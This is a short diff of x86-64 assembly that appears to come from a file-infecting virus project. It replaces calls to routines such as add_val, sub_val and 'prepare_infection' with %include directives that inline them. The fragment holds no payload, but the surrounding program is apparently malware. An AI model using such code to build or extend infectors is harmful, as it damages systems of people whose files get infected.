@@ -118,7 +118,8 @@
 			add		rdi, mydata.path
 			;lea		rdi, [rel path]
 			xchg	rsi, rdi
-			call	add_val
+			%include "functions/add_val.s"
+			;call	add_val
 			pop		rax
 			pop		rsi
 			pop		rdi
@@ -129,7 +130,8 @@
 			mov		rsi, [rbp + 16]
 			add		rsi, mydata.path
 			;lea		rsi, [rel path]
-			call	sub_val
+			%include "functions/sub_val0.s"
+			;call	sub_val
 			pop		rsi
 
 			push	rax
@@ -193,7 +195,7 @@
 			add		rdi, mydata.path
 			;lea		rdi, [rel path]
 			xchg	rsi, rdi
-			call	add_val
+			%include "functions/add_val0.s"
 			pop		rax
 			pop		rsi
 			pop		rdi
@@ -204,7 +206,8 @@
 			cmp		al, 0
 			je		.error
 
-			call	prepare_infection
+			%include "functions/prepare_infection.s"
+			;call	prepare_infection
 
 		.no_print:
 			add		rsi, rcx
